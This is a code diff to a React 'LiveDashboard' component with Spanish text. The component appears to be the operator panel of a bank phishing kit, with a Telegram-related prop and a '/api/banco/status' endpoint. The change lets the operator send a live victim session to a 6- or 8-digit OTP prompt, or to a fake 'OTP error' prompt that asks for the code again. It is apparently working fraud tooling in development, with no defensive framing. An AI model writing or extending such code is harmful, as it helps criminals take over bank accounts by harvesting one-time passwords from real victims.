@@ -221,10 +221,20 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
   };
 
   const handleAction = async (sessionId: string, action: string) => {
+    let finalAction = action;
+
+    if (action === 'otp') {
+      const is8 = window.confirm('¿El OTP es de 8 dígitos? (Presiona Cancelar si es de 6)');
+      if (is8) finalAction = 'otp8';
+    } else if (action === 'eotp') {
+      const is8 = window.confirm('¿El error OTP es para 8 dígitos? (Presiona Cancelar si es de 6)');
+      if (is8) finalAction = 'eotp8';
+    }
+
     try {
       await fetch('/api/banco/status', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, action }),
+        body: JSON.stringify({ sessionId, action: finalAction }),
       });
     } catch (e) { console.error(e); }
   };
@@ -282,7 +292,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
   };
 
   return (
-    <div className="flex flex-col h-screen bg-stone-950 text-zinc-100 font-sans overflow-hidden">
+    <div className="flex flex-col h-full w-full bg-stone-950 text-zinc-100 font-sans overflow-hidden">
 
       {/* HEADER */}
       <header className="flex-none px-5 py-3 border-b border-stone-800 bg-stone-900 flex items-center justify-between">
